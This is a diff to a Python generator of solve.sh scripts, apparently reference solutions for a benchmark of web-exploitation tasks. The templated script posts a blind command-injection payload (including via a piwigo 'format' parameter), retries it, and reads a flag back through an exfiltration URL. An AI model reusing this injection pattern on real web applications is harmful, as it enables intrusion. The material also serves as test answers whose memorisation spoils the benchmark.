@@ -181,11 +181,12 @@ for i in $(seq 1 60); do
 done
 
 {login_block}
-echo '== inject payload =='
-curl -sf -b "$JAR" -c "$JAR" -o /dev/null -X POST --data '{attack_data}' '{attack_url}'
-
-echo '== read flag back =='
-for i in $(seq 1 10); do
+echo '== inject payload & read flag back =='
+# 攻击与读回放在同一重试循环: ①盲注 payload 常回 4xx/5xx (piwigo format 非法回 400)
+# 但 sink 已触发, 攻击只看副作用不看状态码; ②webapp 首页 200 不代表 PHP/DB 已就绪,
+# 首页轮询通过后立即攻击仍可能打在初始化完成前 —— 攻击幂等 (cp 覆盖), 重试无副作用。
+for i in $(seq 1 15); do
+  curl -s -b "$JAR" -c "$JAR" -o /dev/null -X POST --data '{attack_data}' '{attack_url}' || true
   curl -sf -o /app/results.txt '{exfil_url}' && break
   sleep 2
 done
@@ -202,7 +203,9 @@ curl -sf -c "$JAR" -o /dev/null -X POST --data '{login_data}' '{login_url}'
 
 def build_solve_sh(w: dict) -> str:
     cmd_enc = urllib.parse.quote(w["expose_cmd"], safe="")
+    # {CMD} 可出现在 attack_data (POST 表单) 或 attack_url (GET query, 如 piwigo format 参数)
     attack_data = w["attack_data"].replace("{CMD}", cmd_enc)
+    attack_url = w["attack_url"].replace("{CMD}", cmd_enc)
     login_block = (
         LOGIN_BLOCK.format(login_data=w["login_data"], login_url=w["login_url"])
         if w.get("login_url")
@@ -211,7 +214,7 @@ def build_solve_sh(w: dict) -> str:
     return SOLVE_SH.format(
         canary=CANARY,
         attack_data=attack_data,
-        attack_url=w["attack_url"],
+        attack_url=attack_url,
         exfil_url=w["exfil_url"],
         login_block=login_block,
     )
